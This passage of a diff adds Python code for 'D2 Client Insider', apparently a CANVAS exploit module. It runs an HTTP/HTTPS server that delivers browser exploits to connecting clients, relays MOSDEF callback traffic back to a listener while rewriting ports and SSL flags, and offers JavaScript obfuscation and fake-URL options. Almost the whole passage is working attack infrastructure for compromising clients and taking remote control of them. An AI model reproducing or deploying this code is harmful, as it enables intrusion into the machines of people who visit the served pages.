+       	myheader = "".join(clientheader.data)	
+	mybody = "".join(clientbody.data)			
+	
+	if (clientheader.URL.count("/w") or clientheader.URL.count("/c/") or ('X-mode' in clientheader.headerValuesDict)) and not clientheader.URL.count("/wcpp.exe"):	
+		buff = ""
+		recv_buff = ""
+		
+		timeout = 1
+			
+		s = self.gettcpsock()
+		
+		if self.isNAT:
+			s.connect(("127.0.0.1", myport + 1))	        
+		else:
+			s.connect((self.bindip, myport + 1))	        
+
+		s.send(myheader + mybody)
+		total_data=[]
+		
+		while True:
+			try:
+				data = s.recv(8192)
+				if not data: break
+				total_data.append(data)
+			except:
+				pass
+			
+		buff = ''.join(total_data)								
+		
+		s.close()		
+		
+		if buff.count("/" + self.bindip + ":" + str(myport + 1) + "/"):		
+			buff = buff.replace("/" + self.bindip + ":" + str(myport + 1) + "/", "/" + self.bindip + ":" + str(myport) + "/")
+			
+		if buff.count("POST"):
+			oldport = struct.pack('<L', (myport + 1))
+			newport = struct.pack('<L', (myport))			
+			buff = buff.replace(oldport, newport)
+
+		if ssl:			
+			oldflag = struct.pack('<L', 0x80400100)
+			newflag = struct.pack('<L', 0x84c03100)
+			buff = buff.replace(oldflag, newflag)
+		#	oldflag = struct.pack('<L', 0x80400100)
+		#	newflag = struct.pack('<L', 0x80c03100)
+		#	buff = buff.replace(oldflag, newflag)			
+			        
+	        response = buff
+	        
+	else:
+	        if (ssl):  
+	        	self.log("[D2 LOG] - HTTPS Connection received from %s:%d" % (addr[0], addr[1]))
+	        else:
+	        	self.log("[D2 LOG] - HTTP Connection received from %s:%d" % (addr[0], addr[1]))	        	
+
+	        servheader, servbody, exploit = self.makesploit(clientheader, clientbody, ssl)
+                	
+	        if (servheader == None):            
+	            self.log("[D2 LOG] - Exploit returned None")
+	            conn.close()
+	            return
+	
+	        bodydata = "".join(servbody.data)
+	        
+	        if hasattr(exploit, "mimetype") and exploit.mimetype is not None:
+	            if servheader.hasHeader("Content-Type"):
+	                servheader.setHeader("Content-Type", exploit.mimetype)
+	            else:
+	                servheader.addHeader("Content-Type", exploit.mimetype)
+	            
+	        response = ""
+	        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+	        for akey in servheader.headerValuesDict.keys():
+	            if akey not in ["Content-Length", "Content-length"]:
+	                response += servheader.grabHeader(akey)
+	                
+	        chunked = 0
+	        
+	        if not chunked:
+	            response += "Content-Length: " + str(len(bodydata)) + "\r\n"
+	            
+	        response += "\r\n"
+	        response += "".join(bodydata)
+        
+        try:            
+            conn.send(response)
+                        
+        except socket.error:
+            self.log("[D2 LOG] - Connection closed by peer")
+        except:
+            return        	
+                    
+        return 
+
+
+    def accept(self, s, ssl):
+
+	try:
+		(infd, addr) = s.accept()        
+		
+	except timeoutsocket.Timeout:
+		return
+        
+        if (infd == -1):
+            return
+              
+        thread.start_new_thread(self.handle, (infd, ssl, addr))
+        
+        return True
+
+
+    def listen(self, tcpport):
+
+        if self.isNAT:
+        	s = self.gettcplistener(tcpport, "0.0.0.0")
+        else:
+        	s = self.gettcplistener(tcpport, self.bindip)
+
+        if not s:
+		if self.port < 1024:
+                	self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
+                                 "you can try to bind to a higher port" % self.port)
+		else:
+                	self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
+            	return 0
+        
+	s.set_timeout(5)                        
+        
+        return s 
+
+
+    def startHTTPServer(self, port, ssl):
+        
+        s = self.listen(port)
+        
+        if not s:
+		self.log("[D2 LOG] - Failed to listen - Server not running")
+		return 0
+            
+        if ssl:
+        	self.sslsock = s
+        else:
+        	self.s = s
+        	
+        while 1:
+		if self.state == self.HALT:
+                	s.close()
+                	break
+                
+		self.accept(s, ssl)
+        
+        return 1
+
+
+    def startServer(self):
+    	
+    	self.createGUI()
+    	
+    	if self.cancel:
+    		return
+    	
+    	# Selected configuration
+    	self.log("[D2 LOG] - D2 Client Insider started on %s:%d (HTTP)" % (self.bindip, self.httpport))
+    	
+    	if (self.withssl):
+    		self.log("[D2 LOG] - D2 Client Insider started on %s:%d (HTTPS)" % (self.bindip, self.httpsport))
+    	
+    	if (self.withobfus):
+    		self.log("[D2 LOG] - Javascript obfuscation option selected")
+    		
+    	if (self.withfakeurl):
+    		self.log("[D2 LOG] - Fake URL option selected [%s]" % (self.fakeurl))
+    	
+    	
+	# Start MOSDEF listener	
+	if not (self.cmdline):    	
+		node = self.argsDict["passednodes"][0]
+		interface = node.interfaces.get_ip(self.bindip)
+		
+		if interface.isNAT:
+			self.isNAT = True			
+		
+		self.callback = self.engine.start_listener(interface, HTTPMOSDEF, self.httpport + 1)
+		
+		if self.withssl:
+			self.sslcallback = self.engine.start_listener(interface, HTTPMOSDEF, self.httpsport + 1)
+
+	# Fill the exploits list
+    	self.log("[D2 LOG] - Selected exploits:")
+    	
+    	i = 0
+
+    	for expl in self.selectedexploits:
+    		self.log("[D2 LOG] - [%d] - %s" % (i + 1, expl))
+    		
+		ret = self.engine.getModule(expl)
+
+                if ret:
+                    exploit = ret.theexploit()
+                    exploit.HTTPMOSDEF = 1
+                    exploit.useSSL = 0                   
+                    exploit.link(self)                     
+                    exploit.callback.ip = self.bindip
+                    exploit.callback.port = self.httpport                    
+                    self.exploitslist[i] = exploit
+                    i = i + 1
+	
+    	# Start HTTP server thread	    	
+	thread.start_new_thread(self.startHTTPServer, (self.httpport, False))
+
+    	# Start HTTPS server thread	    	
+    	if self.withssl:
+		thread.start_new_thread(self.startHTTPServer, (self.httpsport, True))
+		
+	return
+
+
+    def run(self):
+    		    	
+    	# Check arguments
+    	self.getargs()    	    	
+    	
+    	# Launch GUI
+    	if (self.cmdline):    	
+    		self.startServer()
+    	else:
+    		self.do_gui_operation(self.startServer)
+
+	if self.cancel:
+		return 1
+		    	    	
+	# Main loop	
+	while 1:
+		if (self.state == self.HALT):			
+			# Stop server and exploits
+			if self.callback != None:			
+				self.callback.closeme()
+				
+			if self.sslcallback != None:								
+				self.sslcallback.closeme()
+			
+			for num, expl in self.exploitslist.iteritems():
+				expl.halt()
+				
+                	break
+                	
+		time.sleep(1)
+	        	        
+        return 1
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+
